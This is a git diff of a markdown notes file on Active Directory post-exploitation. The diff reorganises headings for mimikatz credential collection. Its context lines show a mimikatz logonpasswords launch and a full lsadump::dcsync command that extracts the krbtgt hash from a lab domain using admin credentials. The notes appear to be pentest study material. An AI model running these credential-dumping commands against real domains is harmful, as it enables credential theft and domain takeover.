@@ -20,6 +20,8 @@ This is a collection of notes about active directory and (post)exploitation
   * [Golden Ticket](#golden-ticket)
   * [Machine Domain admin (Use machine NTLM hash)](#machine-domain-admin--use-machine-ntlm-hash-)
   * [Credential Collection](#credential-collection)
+    + [mimikatz logonpasswords (cmd needs to run administrators rights / locally)](#mimikatz-logonpasswords--cmd-needs-to-run-administrators-rights---locally-)
+    + [mimikatz dcsync (dcsync / authuser should be admin rights)](#mimikatz-dcsync--dcsync---authuser-should-be-admin-rights-)
 
 
 # Enumeration
@@ -638,7 +640,7 @@ regular cmd shell (access denied)
 
 ## Credential Collection
 
-mimikatz (cmd needs to run administrators rights / locally)
+### mimikatz logonpasswords (cmd needs to run administrators rights / locally)
 
 	PS C:\Users\thor\Desktop\mimikatz\x64> .\mimikatz.exe
 
@@ -684,7 +686,7 @@ mimikatz (cmd needs to run administrators rights / locally)
 			credman :
 			
 			
-mimikatz (dcsync / authuser should be admin rights)
+### mimikatz dcsync (dcsync / authuser should be admin rights)
 
 
 	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt /authuser:administrator /authpassword:Pass123!
